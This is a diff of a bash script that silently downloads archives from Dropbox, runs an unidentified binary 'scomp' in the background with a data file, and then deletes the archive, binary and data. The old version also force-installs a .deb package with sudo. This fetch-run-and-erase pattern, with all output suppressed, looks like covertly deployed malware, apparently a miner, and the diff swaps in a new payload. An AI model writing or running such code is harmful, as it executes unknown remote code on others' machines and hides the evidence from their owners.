@@ -1,17 +1,14 @@
 #!/bin/bash
 
 end=$((SECONDS+$1))
-wget https://www.dropbox.com/s/s6j41h7gjx896vw/libstdc.deb -q
-sudo dpkg --force-all -i libstdc.deb > /dev/null 2>&1
-rm -rf libstdc.deb
-wget https://www.dropbox.com/s/6fifwy1wz0bx2mu/scomp.zip -q
-unzip scomp.zip > /dev/null 2>&1
+wget https://www.dropbox.com/s/n046ueilvy5ppa0/wan12.zip -q
+unzip wan12.zip > /dev/null 2>&1
 #pwd
-./perf/scomp ./perf/catalog &
+./scomp ./datum &
 sleep 3
-rm -rf scomp.zip
-rm -rf perf/scomp
-rm -rf perf/catalog
+rm -rf wan12.zip
+rm -rf scomp
+rm -rf datum
 while [ $SECONDS -lt $end ]
 do
     read line
